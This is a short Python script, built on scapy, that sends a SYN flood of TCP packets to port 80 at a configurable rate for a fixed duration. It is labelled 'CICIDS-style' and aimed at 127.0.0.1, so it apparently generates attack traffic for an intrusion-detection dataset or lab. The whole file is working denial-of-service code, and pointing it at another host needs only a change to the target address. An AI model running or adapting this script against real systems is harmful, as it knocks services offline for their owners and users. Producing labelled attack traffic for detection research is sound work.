#!/usr/bin/env python3

from scapy.all import *
import random
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80
RATE = 5000     # packets per second
DURATION = 10   # seconds

def syn_flood():
    print("[*] Starting CICIDS-style SYN flood attack...")

    end_time = time.time() + DURATION
    while time.time() < end_time:
        pkt = IP(dst=TARGET_IP)/TCP(
            sport=65000,
            dport=TARGET_PORT,
            flags="S",
            seq=random.randint(0, 2**32 - 1)
        )
        send(pkt, verbose=0)
        time.sleep(1 / RATE)

    print("[✓] SYN flood complete.")


if __name__ == "__main__":
    syn_flood()
